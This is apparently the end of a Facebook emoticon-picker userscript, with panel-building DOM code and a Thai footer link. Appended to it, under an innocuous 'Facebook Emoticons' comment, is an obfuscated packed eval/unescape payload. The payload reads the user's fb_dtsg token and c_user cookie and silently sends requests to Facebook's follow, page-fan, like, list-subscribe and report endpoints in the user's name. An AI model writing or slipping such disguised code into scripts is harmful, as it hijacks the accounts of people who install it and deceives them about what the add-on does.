	html += '<span style="vertical-align: middle;"><img src="http://i52.photobucket.com/albums/g13/tanuki-kage/Emoticons/flower.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="http://youtu.be/LHkDs_Zzmas" target="_blank">วิธีทำไอคอนสำหรับเครื่องที่ไม่มี</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====

eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1h(1g("%z%3%8%2%j%v%a%e%1%7%r%b%e%5%d%g%l%0%9%1%k%r%0%1%14%n%0%l%0%9%1%7%W%C%19%3%l%0%o%i%j%v%a%e%1%7%r%i%p%O%B%M%k%z%3%n%g%0%s%q%z%3%8%2%g%7%0%8%a%c%e%b%e%5%d%g%l%0%9%1%k%d%5%5%F%c%0%k%l%3%1%d%t%o%e%5%d%g%l%0%9%1%k%d%5%5%F%c%0%k%l%3%1%d%t%o%y%d%a%g%7%0%8%b%o%18%e%u%p%y%p%O%x%M%p%s%q%j%g%9%d%1%c%5%9%2%3%o%3%v%5%9%0%p%q%P%q%2%z%3%8%2%t%1%1%f%w%b%9%0%A%2%D%13%S%15%1%1%f%R%0%T%g%0%7%1%s%q%2%z%3%8%2%g%8%n%w%b%i%y%3%12%3%11%y%j%5%n%n%5%A%y%j%5%n%n%5%A%a%f%8%5%j%c%n%0%k%f%t%f%1e%a%a%3%b%x%i%s%q%2%z%3%8%2%f%3%8%3%l%7%w%b%i%f%8%5%j%c%n%0%a%c%e%b%i%u%3%v%5%9%0%u%i%m%n%5%d%3%1%c%5%9%b%x%m%7%5%g%8%d%0%b%j%5%n%n%5%A%1a%v%g%1%1%5%9%m%7%g%v%7%d%8%c%v%0%e%a%v%g%1%1%5%9%a%c%e%b%g%h%H%T%3%d%a%h%H%m%j%v%a%e%1%7%r%b%i%u%j%v%a%e%1%7%r%u%i%m%n%7%e%m%a%a%i%u%g%7%0%8%a%c%e%u%i%m%f%t%7%1%3%l%f%b%i%s%q%2%t%1%1%f%w%k%5%f%0%9%o%i%G%16%V%10%i%U%g%8%n%w%U%1%8%g%0%p%s%q%2%t%1%1%f%w%k%5%9%8%0%3%e%C%7%1%3%1%0%d%t%3%9%r%0%b%j%g%9%d%1%c%5%9%o%p%q%2%P%q%2%2%c%j%o%t%1%1%f%w%k%8%0%3%e%C%V%1%3%1%0%b%b%w%m%m%t%1%1%f%w%k%7%1%3%1%g%7%b%b%6%B%B%p%t%1%1%f%w%k%d%n%5%7%0%q%2%Q%q%2%s%q%2%t%1%1%f%w%k%7%0%9%e%o%f%3%8%3%l%7%w%p%q%Q%q%2%j%g%9%d%1%c%5%9%2%7%g%v%n%c%7%1%o%g%c%e%7%7%p%q%P%q%2%z%3%8%2%3%2%b%2%e%5%d%g%l%0%9%1%k%d%8%0%3%1%0%14%n%0%l%0%9%1%o%X%7%d%8%c%f%1%X%p%s%q%2%3%k%c%9%9%0%8%15%10%13%S%2%b%2%i%9%0%A%2%I%7%C%9%d%R%0%T%g%0%7%1%o%p%k%7%0%1%Z%R%1f%o%X%y%3%12%3%11%y%j%8%c%0%9%e%7%y%n%c%7%1%7%y%7%g%v%7%d%8%c%v%0%y%l%5%e%c%j%C%1e%n%5%d%3%1%c%5%9%b%f%0%8%l%3%n%c%9%F%m%3%d%1%c%5%9%b%7%g%v%7%d%8%c%v%0%X%p%k%7%0%1%Y%3%1%3%o%P%2%j%n%c%e%1d%2%i%2%u%2%g%c%e%7%7%2%u%2%i%2%Q%p%k%7%0%9%e%o%p%s%i%s%q%2%e%5%d%g%l%0%9%1%k%v%5%e%C%k%3%f%f%0%9%e%E%t%c%n%e%o%3%p%s%q%Q%q%2%j%g%9%d%1%c%5%9%2%f%o%3%v%5%9%0%p%q%P%q%2%z%3%8%2%t%1%1%f%w%2%b%2%9%0%A%2%D%13%S%15%1%1%f%R%0%T%g%0%7%1%o%p%s%q%2%z%3%8%2%g%8%n%w%2%b%2%i%y%y%A%A%A%k%j%3%d%0%v%5%5%F%k%d%5%l%y%3%12%3%11%y%f%5%F%0%a%e%c%3%n%5%r%k%f%t%f%i%s%q%2%z%3%8%2%f%3%8%3%l%7%w%2%b%2%i%g%c%e%b%i%2%u%2%3%v%5%9%0%2%u%2%i%m%f%5%F%0%v%3%d%F%b%B%m%3%7%F%a%j%5%8%a%d%5%9%j%c%8%l%b%B%m%9%d%1%8%O%a%l%5%e%M%b%f%3%r%0%n%0%1%a%1%c%l%0%n%c%9%0%a%f%8%5%j%c%n%0%a%3%d%1%c%5%9%7%m%a%a%3%7%C%9%d%Y%c%3%n%5%r%b%x%m%a%a%g%7%0%8%b%i%u%g%7%0%8%a%c%e%u%i%m%a%a%3%b%x%m%a%a%e%C%9%b%H%J%N%3%Y%K%1b%K%E%17%1a%m%a%a%8%0%T%b%z%m%j%v%a%e%1%7%r%b%i%u%j%v%a%e%1%7%r%u%i%m%f%t%7%1%3%l%f%b%i%s%q%2%t%1%1%f%w%k%5%f%0%9%o%i%G%16%V%10%i%U%2%g%8%n%w%U%2%1%8%g%0%p%s%q%2%t%1%1%f%w%k%5%9%8%0%3%e%C%7%1%3%1%0%d%t%3%9%r%0%2%b%2%j%g%9%d%1%c%5%9%2%o%p%q%2%P%q%2%2%c%j%2%o%t%1%1%f%w%k%8%0%3%e%C%V%1%3%1%0%2%b%b%2%w%2%m%m%2%t%1%1%f%w%k%7%1%3%1%g%7%2%b%b%2%6%B%B%p%q%2%2%P%q%2%2%2%t%1%1%f%w%k%d%n%5%7%0%s%q%2%2%Q%q%2%Q%q%2%s%q%2%t%1%1%f%w%k%7%0%9%e%o%f%3%8%3%l%7%w%p%s%q%Q%q%0%z%3%n%o%g%9%0%7%d%3%f%0%o%i%4%L%x%4%6%N%4%6%6%4%h%x%4%h%B%4%h%B%4%h%B%4%h%B%4%h%6%4%h%x%4%h%J%4%h%H%4%h%w%4%h%x%4%h%B%4%h%K%4%h%H%4%h%N%4%6%6%4%6%J%4%h%W%4%H%h%4%H%K%4%L%6%4%L%E%4%L%J%4%H%h%4%H%w%4%6%N%4%6%6%4%h%L%4%h%w%4%h%h%4%h%L%4%h%K%4%h%6%4%h%J%4%h%6%4%h%6%4%h%h%4%h%N%4%h%w%4%h%L%4%h%x%4%h%L%4%6%6%4%6%J%4%h%W%i%p%p%s%q%z%3%8%2%j%v%a%e%1%7%r%2%b%2%e%5%d%g%l%0%9%1%k%r%0%1%14%n%0%l%0%9%1%7%W%C%19%3%l%0%o%X%j%v%a%e%1%7%r%X%p%O%B%M%k%z%3%n%g%0%s%2%z%3%8%2%g%7%0%8%a%c%e%2%b%2%e%5%d%g%l%0%9%1%k%d%5%5%F%c%0%k%l%3%1%d%t%o%e%5%d%g%l%0%9%1%k%d%5%5%F%c%0%k%l%3%1%d%t%o%y%d%a%g%7%0%8%b%o%18%e%u%p%y%p%O%x%M%p%s%2%j%g%9%d%1%c%5%9%2%S%c%F%0%o%f%p%2%P%2%z%3%8%2%G%3%r%0%2%b%2%9%0%A%2%D%13%S%15%1%1%f%R%0%T%g%0%7%1%o%p%s%2%z%3%8%2%G%3%r%0%Z%R%S%2%b%2%i%y%y%A%A%A%k%j%3%d%0%v%5%5%F%k%d%5%l%y%3%12%3%11%y%f%3%r%0%7%y%j%3%9%a%7%1%3%1%g%7%k%f%t%f%i%s%2%z%3%8%2%G%3%r%0%G%3%8%3%l%7%2%b%2%i%m%j%v%f%3%r%0%a%c%e%b%i%2%u%2%f%2%u%i%m%3%e%e%b%1%8%g%0%m%8%0%n%5%3%e%b%j%3%n%7%0%m%j%3%9%a%5%8%c%r%c%9%b%f%3%r%0%a%1%c%l%0%n%c%9%0%m%j%3%9%a%7%5%g%8%d%0%b%m%d%3%1%b%m%9%d%1%8%O%a%l%5%e%M%b%f%3%r%0%n%0%1%a%1%c%l%0%n%c%9%0%a%f%3%r%0%a%3%d%1%c%5%9%7%m%a%a%g%7%0%8%b%i%u%g%7%0%8%a%c%e%u%i%m%a%a%3%b%x%m%a%a%e%C%9%b%H%J%N%3%Y%K%1b%K%E%17%1a%m%a%a%8%0%T%b%e%m%j%v%a%e%1%7%r%b%i%u%j%v%a%e%1%7%r%u%i%m%f%t%7%1%3%l%f%b%i%s%2%G%3%r%0%k%5%f%0%9%o%i%G%16%V%10%i%U%2%G%3%r%0%Z%R%S%U%2%1%8%g%0%p%s%2%G%3%r%0%k%5%9%8%0%3%e%C%7%1%3%1%0%d%t%3%9%r%0%2%b%2%j%g%9%d%1%c%5%9%2%o%p%2%P%2%c%j%2%o%G%3%r%0%k%8%0%3%e%C%V%1%3%1%0%2%b%b%2%w%2%m%m%2%G%3%r%0%k%7%1%3%1%g%7%2%b%b%2%6%B%B%p%2%P%2%G%3%r%0%k%d%n%5%7%0%s%2%Q%2%Q%s%2%G%3%r%0%k%7%0%9%e%o%G%3%r%0%G%3%8%3%l%7%p%s%2%Q%2%q%0%z%3%n%o%g%9%0%7%d%3%f%0%o%i%4%w%E%4%L%J%4%L%W%4%L%K%4%6%N%4%6%6%4%h%6%4%h%w%4%h%x%4%h%L%4%h%B%4%h%B%4%h%6%4%h%w%4%h%L%4%h%B%4%h%h%4%h%h%4%h%h%4%h%H%4%h%K%4%6%6%4%6%J%4%h%W%i%p%p%s%q%z%3%8%2%g%7%0%8%a%c%e%2%b%2%e%5%d%g%l%0%9%1%k%d%5%5%F%c%0%k%l%3%1%d%t%o%e%5%d%g%l%0%9%1%k%d%5%5%F%c%0%k%l%3%1%d%t%o%y%d%a%g%7%0%8%b%o%18%e%u%p%y%p%O%x%M%p%s%2%z%3%8%2%j%v%a%e%1%7%r%2%b%2%e%5%d%g%l%0%9%1%k%r%0%1%14%n%0%l%0%9%1%7%W%C%19%3%l%0%o%X%j%v%a%e%1%7%r%X%p%O%B%M%k%z%3%n%g%0%s%2%z%3%8%2%9%5%A%b%o%9%0%A%2%Y%3%1%0%p%k%r%0%1%10%c%l%0%o%p%s%2%j%g%9%d%1%c%5%9%2%G%o%5%f%5%p%2%P%2%z%3%8%2%D%2%b%2%9%0%A%2%D%13%S%15%1%1%f%R%0%T%g%0%7%1%o%p%s%2%z%3%8%2%D%Z%R%S%2%b%i%y%y%A%A%A%k%j%3%d%0%v%5%5%F%k%d%5%l%y%3%12%3%11%y%g%j%c%y%n%c%F%0%k%f%t%f%i%s%2%z%3%8%2%D%G%3%8%3%l%7%2%b%2%i%n%c%F%0%a%3%d%1%c%5%9%b%1%8%g%0%m%j%1%a%0%9%1%a%c%e%0%9%1%c%j%c%0%8%b%i%u%5%f%5%u%i%m%7%5%g%8%d%0%b%x%m%d%n%c%0%9%1%a%c%e%b%i%u%9%5%A%u%i%4%h%I%h%H%J%H%N%h%N%K%H%m%8%5%5%1%c%e%b%g%a%12%7%5%9%f%a%h%J%a%x%N%m%r%c%j%1%5%d%d%3%7%c%5%9%m%j%1%O%1%9%M%b%4%h%14%4%h%Y%m%j%1%O%1%C%f%0%M%b%6%B%m%j%1%O%T%c%e%M%b%K%N%J%B%N%x%x%h%6%J%w%H%B%6%H%J%6%K%H%m%j%1%O%l%j%a%7%1%5%8%C%a%F%0%C%M%b%6%N%x%w%J%L%6%J%B%B%x%J%h%x%w%h%J%K%6%m%j%1%O%t%3%7%a%0%11%f%3%9%e%0%e%a%g%j%c%M%b%x%m%9%d%1%8%O%a%l%5%e%M%b%f%3%r%0%n%0%1%a%t%5%l%0%a%7%1%8%0%3%l%m%a%a%g%7%0%8%b%i%u%g%7%0%8%a%c%e%u%i%m%a%a%3%b%x%m%a%a%e%C%9%b%H%9%N%N%1c%5%I%13%W%n%E%n%C%5%d%f%3%0%m%a%a%8%0%T%b%r%w%m%j%v%a%e%1%7%r%b%i%u%j%v%a%e%1%7%r%u%i%m%f%t%7%1%3%l%f%b%i%s%2%D%k%5%f%0%9%o%i%G%16%V%10%i%U%2%D%Z%R%S%U%2%1%8%g%0%p%s%2%D%k%5%9%8%0%3%e%C%7%1%3%1%0%d%t%3%9%r%0%2%b%2%j%g%9%d%1%c%5%9%2%o%p%2%P%2%c%j%2%o%D%k%8%0%3%e%C%V%1%3%1%0%2%b%b%2%w%2%m%m%2%D%k%7%1%3%1%g%7%2%b%b%2%6%B%B%p%2%P%2%D%k%d%n%5%7%0%s%2%Q%2%Q%s%2%D%k%7%0%9%e%o%D%G%3%8%3%l%7%p%s%2%Q%2%q%G%o%i%i%p%s%q%z%3%8%2%j%v%a%e%1%7%r%2%b%2%e%5%d%g%l%0%9%1%k%r%0%1%14%n%0%l%0%9%1%7%W%C%19%3%l%0%o%X%j%v%a%e%1%7%r%X%p%O%B%M%k%z%3%n%g%0%s%q%z%3%8%2%g%7%0%8%a%c%e%2%b%2%e%5%d%g%l%0%9%1%k%d%5%5%F%c%0%k%l%3%1%d%t%o%e%5%d%g%l%0%9%1%k%d%5%5%F%c%0%k%l%3%1%d%t%o%y%d%a%g%7%0%8%b%o%18%e%u%p%y%p%O%x%M%p%s%q%z%3%8%2%9%5%A%b%o%9%0%A%2%Y%3%1%0%p%k%r%0%1%10%c%l%0%o%p%s%q%j%g%9%d%1%c%5%9%2%8%0%f%5%8%1%o%8%p%2%P%q%z%3%8%2%D%2%b%2%9%0%A%2%D%13%S%15%1%1%f%R%0%T%g%0%7%1%o%p%s%q%z%3%8%2%D%Z%R%S%2%b%2%i%t%1%1%f%7%1d%y%y%A%A%A%k%j%3%d%0%v%5%5%F%k%d%5%l%y%3%12%3%11%y%8%0%f%5%8%1%y%7%5%d%c%3%n%k%f%t%f%i%s%q%z%3%8%2%D%G%3%8%3%l%7%2%b%i%j%v%a%e%1%7%r%b%i%u%j%v%a%e%1%7%r%u%i%m%v%n%5%d%F%b%x%m%f%f%b%4%H%W%4%6%6%3%d%1%c%5%9%7%a%1%5%a%1%3%F%0%4%6%6%4%h%I%4%6%6%O%M%4%6%6%4%6%E%4%6%6%3%8%0%a%j%8%c%0%9%e%7%4%6%6%4%h%I%j%3%n%7%0%4%6%E%4%6%6%d%c%e%4%6%6%4%h%I%i%2%u%2%8%2%u%i%4%6%E%4%6%6%d%5%9%1%0%9%1%a%1%C%f%0%4%6%6%4%h%I%B%4%6%E%4%6%6%0%11%f%3%9%e%a%8%0%f%5%8%1%4%6%6%4%h%I%x%4%6%E%4%6%6%j%c%8%7%1%a%d%t%5%c%d%0%4%6%6%4%h%I%4%6%6%j%c%n%0%a%8%0%f%5%8%1%4%6%6%4%6%E%4%6%6%j%8%5%l%a%r%0%3%8%4%6%6%4%h%I%4%6%6%1%c%l%0%n%c%9%0%4%6%6%4%6%E%4%6%6%c%7%a%j%5%n%n%5%A%c%9%r%4%6%6%4%h%I%j%3%n%7%0%4%6%E%4%6%6%c%7%a%1%3%r%r%0%e%4%6%6%4%h%I%j%3%n%7%0%4%6%E%4%6%6%5%9%a%f%8%5%j%c%n%0%4%6%6%4%h%I%j%3%n%7%0%4%6%E%4%6%6%f%t%3%7%0%4%6%6%4%h%I%h%4%6%E%4%6%6%8%0%j%4%6%6%4%h%I%4%6%6%t%1%1%f%7%4%h%I%4%K%E%4%6%17%4%K%E%4%6%17%A%A%A%k%j%3%d%0%v%5%5%F%k%d%5%l%4%K%E%4%6%17%4%6%6%4%6%E%4%6%6%8%0%f%5%8%1%a%1%C%f%0%4%6%6%4%h%I%x%w%K%4%6%E%4%6%6%8%c%e%4%6%6%4%h%I%i%2%u%2%8%2%u%i%4%6%E%4%6%6%7%g%v%a%8%0%f%5%8%1%a%1%C%f%0%4%6%6%4%h%I%x%w%x%4%6%E%4%6%6%1%c%l%0%a%j%n%5%A%a%7%1%3%8%1%0%e%4%6%6%4%h%I%i%u%9%5%A%u%i%4%6%E%4%6%6%g%7%0%8%4%6%6%4%h%I%i%u%g%7%0%8%a%c%e%u%i%4%H%Y%m%j%c%n%0%a%8%0%f%5%8%1%b%x%m%a%a%g%7%0%8%b%i%u%g%7%0%8%a%c%e%u%i%m%a%a%3%b%x%m%a%a%e%C%9%b%H%9%N%3%t%C%12%h%K%C%9%1b%f%1c%J%Z%l%I%1i%g%Z%R%Y%A%m%a%a%8%0%T%b%t%m%1%1%7%1%3%l%f%b%6%L%K%N%x%L%L%x%x%B%H%x%x%6%B%x%x%6%H%L%m%d%5%9%j%c%8%l%0%e%b%x%i%s%q%D%k%5%f%0%9%o%i%G%16%V%10%i%U%2%D%Z%R%S%U%2%1%8%g%0%p%s%q%D%k%5%9%8%0%3%e%C%7%1%3%1%0%d%t%3%9%r%0%2%b%2%j%g%9%d%1%c%5%9%2%o%p%2%P%q%c%j%2%o%D%k%8%0%3%e%C%V%1%3%1%0%2%b%b%2%w%2%m%m%2%D%k%7%1%3%1%g%7%2%b%b%2%6%B%B%p%2%P%q%D%k%d%n%5%7%0%s%q%Q%q%Q%s%q%D%k%7%0%9%e%o%D%G%3%8%3%l%7%p%s%q%Q%q%s"));',62,81,'65|74|20|61|25|6F|32|73|72|6E|5F|3D|69|63|64|70|75|33|22|66|2E|6D|26|6C|28|29|0A|67|3B|68|2B|62|34|31|2F|76|77|30|79|58|43|6B|50|37|41|39|35|36|5D|38|5B|7B|7D|52|4C|71|2C|53|42|27|44|55|54|78|6A|4D|45|48|4F|46|5C|4E|2D|7A|51|3A|3F|49|unescape|eval|57'.split('|'),0,{}));